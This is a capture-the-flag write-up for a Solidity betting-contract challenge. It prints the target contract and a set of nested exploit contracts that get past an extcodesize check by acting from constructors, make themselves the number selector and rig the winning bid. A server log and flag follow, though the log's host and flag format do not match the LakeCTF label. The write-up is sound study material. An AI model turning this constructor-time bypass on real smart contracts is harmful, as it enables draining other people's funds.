---
published: 2022-11-11
series: LakeCTF 2022
tags:
- Blockchain
title: Andes

---

Andes is the second of the two Web3 challenges featured in the LakeCTF 2022.

At a first glance the contract may seem extremely lengthy and quirky

```Solidity
contract Andes {
    // designators can designate an address to be the next random
    // number selector
    mapping (address => bool) designators;
    mapping (address => uint) balances;

    address selector;
    uint8 private nextVal;
    address[8][8] bids;

    event Registered(address, uint);
    event RoundFinished(address);
    event GetFlag(bytes32);

    constructor(){
        designators[msg.sender] = true;
        _resetBids();
    }

    function isDesignator(address _address) public view returns(bool){
        return designators[_address];
    }

    modifier onlyDesignators() {
        require(designators[msg.sender] == true, "Not owner");
        _;
    }

    function register() public {
        require(balances[msg.sender] < 10);
        
        balances[msg.sender] = 50;

        emit Registered(msg.sender, 50);
    }

    function setNextSelector(address _selector) public onlyDesignators {
        require(_selector != msg.sender);
        selector = _selector;
    }

    function setNextNumber(uint8 value) public {
        require(selector == msg.sender);
        
        nextVal = value;
    }

    function _resetBids() private {
        for (uint i = 0; i < 8; i++) {
            for (uint j = 0; j < 8; j++) {
                bids[i][j] = address(0);
            }
        }
    }

    function purchaseBid(uint8 bid) public {
        require(balances[msg.sender] > 10);
        require(msg.sender != selector);

        uint row = bid % 8;
        uint col = bid / 8;

        if (bids[row][col] == address(0)) {
            balances[msg.sender] -= 10;
            bids[row][col] = msg.sender;
        }
    }

    function playRound() public onlyDesignators {
        address winner = bids[nextVal % 8][nextVal / 8];

        balances[winner] += 1000;
        _resetBids();

        emit RoundFinished(winner);
    }

    function getFlag(bytes32 token) public {
        require(balances[msg.sender] >= 1000);

        emit GetFlag(token);
    }

    function _canBeDesignator(address _addr) private view returns(bool) {
        uint size = 0;

        assembly {
            size := extcodesize(_addr)
        }

        return size == 0 && tx.origin != msg.sender;
    }

    function designateOwner() public {
        require(_canBeDesignator(msg.sender));
        require(balances[msg.sender] > 0);
        
        designators[msg.sender] = true;
    }

    function getBalance(address addr) public view returns(uint) {
        return balances[addr];
    }
}
```

However we can easily point out the nevralgic parts:

We have a `GetFlag` method that requires the caller to have 1000 coins in the balance mapping.

In order to increase our balance we should win a round

```Solidity
function playRound() public onlyDesignators {
        address winner = bids[nextVal % 8][nextVal / 8];

        balances[winner] += 1000;
        _resetBids();

        emit RoundFinished(winner);
    }
```

In order to win the round we should put a bet on the correct `nextVal`, however this operation can only be performed by the selector, and the selector can only be picked by a designator

```Solidity
  function setNextSelector(address _selector) public onlyDesignators {
      require(_selector != msg.sender);
      selector = _selector;
  }

  function setNextNumber(uint8 value) public {
      require(selector == msg.sender);
      
      nextVal = value;
  }
```

So basically we will need to build a matrioska of Contracts in order to bypass the various checks:

`extcodesize(_addr) == 0` should prevent non-human wallets, however also code in contracts contructor have the codesize set to zero.

Similarly, everytime we need to bypass a `msg.sender` we can create a child contract to use it as a proxy

```Solidity
contract ExploitGrandpa{
  
    Andes targetContract;
    constructor(address targetAddress) {
        targetContract = Andes(targetAddress);
    }
    function setNextNumber() public{
        targetContract.setNextNumber(1);
    }
    
}

contract ExploitFather{
    Andes public targetContract;
    ExploitGrandpa grandpaContract;

    constructor(address targetAddress) {
        targetContract = Andes(targetAddress);
        targetContract.register();
        targetContract.designateOwner();
        grandpaContract = new ExploitGrandpa(targetAddress);
        targetContract.setNextSelector(address(grandpaContract));
        grandpaContract.setNextNumber();
        targetContract.purchaseBid(1);
        targetContract.playRound();

    }
    function getAddress() public view returns(address){
        return address(this);
    }
    function getFlag(bytes32 token) public {
        targetContract.getFlag(token);
    }
    
}

contract ExploitSon{
    ExploitFather fatherContract;
    Andes targetContract;
    constructor(address targetAddress) {
        targetContract = Andes(targetAddress);
        fatherContract = new ExploitFather(targetAddress);

    }
    function getFatherExploitAddress() public view returns(address){
        return fatherContract.getAddress();
    }
    function getFlag(bytes32 token) public {
        fatherContract.getFlag(token);
    }
    
}
```

  

  

```Bash
$ Connection to nile.chall.pwnoh.io port 13378 [tcp/*] succeeded!
> Hello! The contract is running at 0xdCAeeeB6b02A2E5FbAe956200f1b88784bE25500 on the Goerli Testnet.
> Here is your token id: 0xf3f5a1a3bfe698a0de59eab124cfa2fb
> Are you ready to receive your flag? (y/n)
$ y
> Here is the flag: buckeye{n3v3r_g4mbl1ng_4g41n}
```